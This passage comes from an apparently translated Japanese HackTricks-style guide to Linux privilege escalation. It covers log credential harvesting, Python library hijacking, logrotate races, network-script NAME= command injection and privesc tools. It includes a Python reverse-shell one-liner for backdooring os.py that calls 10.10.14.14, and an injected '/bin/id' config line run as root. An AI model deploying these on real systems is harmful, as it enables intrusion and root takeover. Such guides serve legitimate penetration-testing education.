ログが読める場合、そこから **興味深い／機密情報** を見つけられるかもしれません。ログが奇妙であればあるほど、（おそらく）より興味深くなります。\
また、設定が**悪い**（バックドア化されている？）**監査ログ**は、パスワードを**監査ログ内に記録**させてしまうことがあり、これは次の投稿で説明されています: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読むためのグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) は非常に役に立ちます。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名や内容に "**password**" が含まれていないかも確認し、logs 内の IPs や emails、または hashes にマッチする regexps もチェックしてください。\
ここですべての方法を列挙するつもりはありませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを参照してください。

## 書き込み可能なファイル

### Python ライブラリ hijacking

もしどこから python スクリプトが実行されるか分かっていて、そのフォルダに書き込みができる、あるいは python ライブラリを変更できるなら、OS ライブラリを改変して backdoor を仕込むことができます（python スクリプトが実行される場所に書き込みできるなら、os.py ライブラリをコピーして貼り付けてください）。

ライブラリに **backdoor the library** するには、os.py ライブラリの末尾に次の行を追加してください（IP と PORT を変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` の脆弱性により、ログファイルやその親ディレクトリに対して **write permissions** を持つユーザーが権限昇格を得る可能性があります。これは、通常 **root** として動作する `logrotate` が操作されて任意のファイルを実行させられるためで、特に _**/etc/bash_completion.d/**_ のようなディレクトリで問題になります。権限は _/var/log_ だけでなく、ログローテーションが適用される任意のディレクトリでも確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` 以前に影響します

この脆弱性の詳細は次のページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** に非常によく似ています。したがって、ログを変更できる場合は、誰がそのログを管理しているかを確認し、ログを symlinks に置き換えて escalate privileges できるかどうかを調べてください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由でユーザーが _/etc/sysconfig/network-scripts_ に `ifcf-<whatever>` スクリプトを **write** できる、または既存のスクリプトを **adjust** できる場合、システムは既に **pwned** されています。

Network scripts（例: _ifcg-eth0_）はネットワーク接続に使用されます。見た目は .INI ファイルとまったく同じです。しかし、これらは Linux 上で Network Manager（dispatcher.d）によって ~sourced~ されます。

私のケースでは、これらのネットワークスクリプト内の `NAME=` の扱いが正しくありません。**名前に white/blank space があると、システムはその white/blank space の後ろの部分を実行しようとします。** つまり、**最初の空白の後のすべてが root として実行されます。**

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id_ の間の空白に注意_)

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **スクリプト** が置かれている場所です。これは `start`、`stop`、`restart`、場合によっては `reload` といったサービス操作用のスクリプトを含みます。これらは直接実行することも、`/etc/rc?.d/` にあるシンボリックリンク経由で実行することもできます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。

一方で `/etc/init` は **Upstart** に関連しており、Ubuntu が導入した新しい **service management** 向けの設定ファイルを使います。Upstart への移行が行われても、互換レイヤーのために SysVinit スクリプトは Upstart の設定と共に引き続き利用されます。

**systemd** は近代的な初期化およびサービス管理デーモンとして登場し、オンデマンドでのデーモン起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供します。配布パッケージ向けのファイルは `/usr/lib/systemd/` に、管理者が変更するためのファイルは `/etc/systemd/system/` に配置され、システム管理を簡素化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android の rooting frameworks は、特権のあるカーネル機能を userspace の manager に公開するために syscall をフックすることが一般的です。FD-order に基づく署名チェックや脆弱なパスワード方式など、弱い manager 認証（例）があると、ローカルアプリが manager を偽装して既に root 化されたデバイス上で root にエスカレーションできる可能性があります。詳細とエクスプロイトの手順は以下を参照してください：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations における regex 駆動の service discovery は、プロセスのコマンドラインからバイナリパスを抽出し、特権コンテキストで -v を付けて実行することがあります。許容的なパターン（例: \S を使う）によって、書き込み可能な場所（例: /tmp/httpd）に設置した攻撃者用リスナーにマッチし、root として実行される（CWE-426 Untrusted Search Path）可能性があります。

詳細と他の discovery/monitoring スタックにも応用可能な一般化されたパターンは以下を参照してください：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と Mac のカーネル脆弱性を列挙します [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
